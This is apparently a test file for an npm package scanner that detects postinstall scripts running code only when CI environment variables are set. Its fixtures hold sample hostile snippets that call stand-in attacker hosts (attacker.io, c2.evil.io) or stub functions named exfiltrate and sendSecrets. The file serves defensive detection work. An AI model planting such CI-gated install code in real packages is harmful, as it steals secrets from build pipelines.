import { describe, it } from 'node:test';
import * as assert from 'node:assert/strict';
import { analyzeConditionalExec } from '../../../src/analysis/analyzers/conditional-exec.js';
import type { AnalysisContext } from '../../../src/analysis/types.js';
import type { Packument } from '../../../src/registry/types.js';

const EMPTY_PACKUMENT: Packument = {
  name: 'test-pkg',
  'dist-tags': { latest: '1.0.0' },
  versions: {},
  time: {},
  maintainers: [],
};

function makeContext(source: string): AnalysisContext {
  return {
    packageName: 'test-pkg',
    version: '1.0.0',
    extractedPath: '/tmp/fake',
    allFiles: [],
    installScripts: [
      {
        lifecycle: 'postinstall',
        command: 'node install.js',
        resolvedFile: '/tmp/fake/package/install.js',
        source,
      },
    ],
    packument: EMPTY_PACKUMENT,
  };
}

describe('analyzeConditionalExec', () => {
  it('detects if (process.env.CI) check as high finding', () => {
    const findings = analyzeConditionalExec(makeContext(`
      if (process.env.CI) {
        fetch('https://attacker.io/collect');
      }
    `));
    assert.ok(findings.some((f) => f.category === 'install-script-conditional-exec' && f.level === 'high'));
  });

  it('detects GITHUB_ACTIONS check in conditional', () => {
    const findings = analyzeConditionalExec(makeContext(`
      if (process.env.GITHUB_ACTIONS) {
        require('https').get('https://c2.evil.io');
      }
    `));
    assert.ok(findings.some((f) => f.category === 'install-script-conditional-exec'));
  });

  it('detects logical AND with CI check', () => {
    const findings = analyzeConditionalExec(makeContext(`
      process.env.CI && exfiltrate();
    `));
    assert.ok(findings.some((f) => f.category === 'install-script-conditional-exec'));
  });

  it('detects ternary with CI check', () => {
    const findings = analyzeConditionalExec(makeContext(`
      const action = process.env.CI ? sendSecrets() : doNothing();
    `));
    assert.ok(findings.some((f) => f.category === 'install-script-conditional-exec'));
  });

  it('detects GITLAB_CI check', () => {
    const findings = analyzeConditionalExec(makeContext(`
      if (process.env.GITLAB_CI) { evil(); }
    `));
    assert.ok(findings.some((f) => f.category === 'install-script-conditional-exec'));
  });

  it('does not flag process.env.CI accessed without a conditional', () => {
    const findings = analyzeConditionalExec(makeContext(`
      const isCI = process.env.CI;
      console.log('Running in CI:', isCI);
    `));
    assert.equal(findings.length, 0);
  });

  it('does not flag scripts with no CI env var checks', () => {
    const findings = analyzeConditionalExec(makeContext(`
      const os = require('os');
      console.log(os.platform());
    `));
    assert.equal(findings.length, 0);
  });
});
